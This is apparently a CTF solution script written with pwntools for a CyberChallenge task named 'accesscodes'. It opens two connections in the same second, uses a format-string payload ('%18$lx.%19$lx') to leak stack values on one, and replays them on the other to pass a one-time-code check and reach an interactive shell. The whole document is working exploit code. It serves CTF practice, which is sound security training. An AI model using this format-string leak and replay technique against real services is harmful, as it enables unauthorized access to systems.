#!/usr/bin/env python3

from pwn import *
import re


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("accesscodes.challs.cyberchallenge.it", 9217)

    return r


def main():

    # Open two connections within a second so we have the same One-Time numbers (we exploit "oracle" to retrieve the answer with the custom format string)
    # NOTE: This might not work in the case the first connection was opened immediately before the "second" (time) lapsed.
    r, oracle = conn(), conn()

    oracle.sendlineafter(b'> ', b'%18$lx.%19$lx')

    match = re.match(rb'.*Your input: (.*)\.(.*).*', oracle.recvlines(2)[-1])
    x, y = match.group(1), match.group(2)

    oracle.close()

    r.sendlineafter(b'> ', x + b' ' + y)
    r.interactive('$ ')

    


if __name__ == "__main__":
    main()
